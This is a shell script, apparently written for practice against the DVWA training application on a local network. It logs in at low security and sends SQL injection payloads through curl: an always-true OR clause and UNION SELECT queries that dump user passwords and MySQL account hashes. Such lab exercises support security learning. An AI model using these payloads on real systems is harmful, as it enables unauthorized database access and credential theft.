#Login with known details
source ../levelled_login.sh low
#Check out the "SQL Injection" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/sqli/ > /dev/null
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/sqli/?id=$(../rawurlencode.sh "garbagethatwillequalfalse' OR 'true'='true")&Submit=Submit" > getall
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/sqli/?id=$(../rawurlencode.sh "garbagethatwillequalfalse' UNION SELECT user(), version() #")&Submit=Submit" > seducesql
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/sqli/?id=$(../rawurlencode.sh "garbagethatwillequalfalse' UNION SELECT user_id, password FROM users#")&Submit=Submit" > seducesqlmore
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/sqli/?id=$(../rawurlencode.sh "garbagethatwillequalfalse' UNION SELECT user, password FROM mysql.user#")&Submit=Submit" > reallyseducesql
unset SECURITY
unset SESSIONID
